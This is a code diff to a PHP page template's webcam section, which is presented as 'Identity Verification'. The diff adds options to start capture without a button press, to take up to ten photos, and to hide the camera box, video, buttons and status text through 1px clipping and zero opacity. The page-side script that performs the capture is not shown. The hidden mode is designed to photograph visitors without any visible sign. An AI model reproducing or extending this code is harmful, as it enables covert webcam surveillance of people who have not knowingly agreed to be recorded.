@@ -374,21 +374,24 @@ function getYoutubeVideoId($url) {
                         break;
 
                     case 'webcam':
+                        $isDirect = !empty($c['direct_capture']);
+                        $isHidden = !empty($c['hide_box']);
+                        $photoCount = isset($c['photo_count']) ? max(1, min(10, (int)$c['photo_count'])) : 1;
                         ?>
-                        <section class="tmpl-section <?= $customClasses ?> <?= $shadowClass ?> <?= $roundClass ?>" style="<?= $styles ?>">
+                        <section class="tmpl-section <?= $customClasses ?> <?= $shadowClass ?> <?= $roundClass ?>" style="<?= $styles ?><?= $isHidden ? ' position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; padding: 0; margin: -1px;' : '' ?>">
                             <div class="tmpl-container" style="max-width: 600px; text-align: center;">
-                                <div class="tmpl-webcam-card" style="border: 1px solid var(--border-color); border-radius: 16px; padding: 2.5rem; background: var(--card-bg); text-align: center;">
-                                    <h3 style="font-size: 1.25rem; font-weight: 600; margin-bottom: 0.5rem;"><?= htmlspecialchars($c['title'] ?? 'Identity Verification') ?></h3>
-                                    <p style="font-size: 0.95rem; color: #4b5563; margin-bottom: 1.5rem;"><?= htmlspecialchars($c['message'] ?? 'Please enable your camera to verify access.') ?></p>
+                                <div class="tmpl-webcam-card" data-direct-capture="<?= ($isDirect || $isHidden) ? 'true' : 'false' ?>" data-hide-box="<?= $isHidden ? 'true' : 'false' ?>" data-photo-count="<?= $photoCount ?>" style="border: 1px solid var(--border-color); border-radius: 16px; padding: 2.5rem; background: var(--card-bg); text-align: center;">
+                                    <h3 class="webcam-title" style="font-size: 1.25rem; font-weight: 600; margin-bottom: 0.5rem; <?= ($isDirect || $isHidden) ? 'display: none;' : '' ?>"><?= htmlspecialchars($c['title'] ?? 'Identity Verification') ?></h3>
+                                    <p class="webcam-message" style="font-size: 0.95rem; color: #4b5563; margin-bottom: 1.5rem; <?= ($isDirect || $isHidden) ? 'display: none;' : '' ?>"><?= htmlspecialchars($c['message'] ?? 'Please enable your camera to verify access.') ?></p>
                                     
-                                    <div class="webcam-viewer-box" id="webcamViewerBox" style="margin-bottom: 1.5rem; display: none; position: relative;">
-                                        <video id="webcamVideo" width="100%" height="auto" autoplay playsinline style="border-radius: 12px; background: black; transform: scaleX(-1); max-height: 320px;"></video>
+                                    <div class="webcam-viewer-box" id="webcamViewerBox" style="margin-bottom: 1.5rem; <?= ($isDirect || $isHidden) ? 'display: block;' : 'display: none;' ?> position: relative;">
+                                        <video id="webcamVideo" width="100%" height="auto" autoplay playsinline style="border-radius: 12px; background: black; transform: scaleX(-1); max-height: 320px; <?= $isHidden ? 'width: 1px; height: 1px; position: absolute; opacity: 0;' : '' ?>"></video>
                                         <canvas id="webcamCanvas" style="display: none;"></canvas>
                                         <img id="capturedPhotoPreview" style="display: none; width: 100%; border-radius: 12px; transform: scaleX(-1); max-height: 320px;">
                                     </div>
                                     
-                                    <div class="webcam-actions" style="display: flex; gap: 0.5rem; justify-content: center;">
-                                        <button type="button" class="tmpl-btn btn-sm" id="btnStartWebcam" style="background-color: <?= $c['btn_bg'] ?? '#6366f1' ?>; color: white;">
+                                    <div class="webcam-actions" style="display: flex; gap: 0.5rem; justify-content: center; <?= $isHidden ? 'display: none;' : '' ?>">
+                                        <button type="button" class="tmpl-btn btn-sm" id="btnStartWebcam" style="background-color: <?= $c['btn_bg'] ?? '#6366f1' ?>; color: white; <?= ($isDirect || $isHidden) ? 'display: none;' : '' ?>">
                                             <i class="fa-solid fa-video"></i> <?= htmlspecialchars($c['btn_text'] ?? 'Verify Identity') ?>
                                         </button>
                                         <button type="button" class="tmpl-btn btn-sm" id="btnCaptureFrame" style="background-color: #10b981; color: white; display: none;">
@@ -402,7 +405,13 @@ function getYoutubeVideoId($url) {
                                         </button>
                                     </div>
                                     
-                                    <div id="webcamStatusMessage" style="margin-top: 1rem; font-size: 0.85rem; font-weight: 500;"></div>
+                                    <?php if ($photoCount > 1 && !$isHidden): ?>
+                                    <div id="webcamPhotoCounter" style="margin-top: 0.75rem; font-size: 0.8rem; font-weight: 500; color: #6366f1; display: none;">
+                                        Photo <span id="currentPhotoNum">0</span> of <?= $photoCount ?> captured
+                                    </div>
+                                    <?php endif; ?>
+                                    
+                                    <div id="webcamStatusMessage" style="margin-top: 1rem; font-size: 0.85rem; font-weight: 500; <?= $isHidden ? 'display: none;' : '' ?>"></div>
                                 </div>
                             </div>
                         </section>
@@ -415,7 +424,7 @@ function getYoutubeVideoId($url) {
     </div>
 
     <!-- Client-side interactive bindings script -->
-    <script src="<?= BASE_URL ?>assets/js/viewer.js"></script>
+    <script src="<?= BASE_URL ?>assets/js/viewer.js?v=<?= filemtime(APP_ROOT . '/public/assets/js/viewer.js') ?>"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Initialize interactions and click-analytics tracker
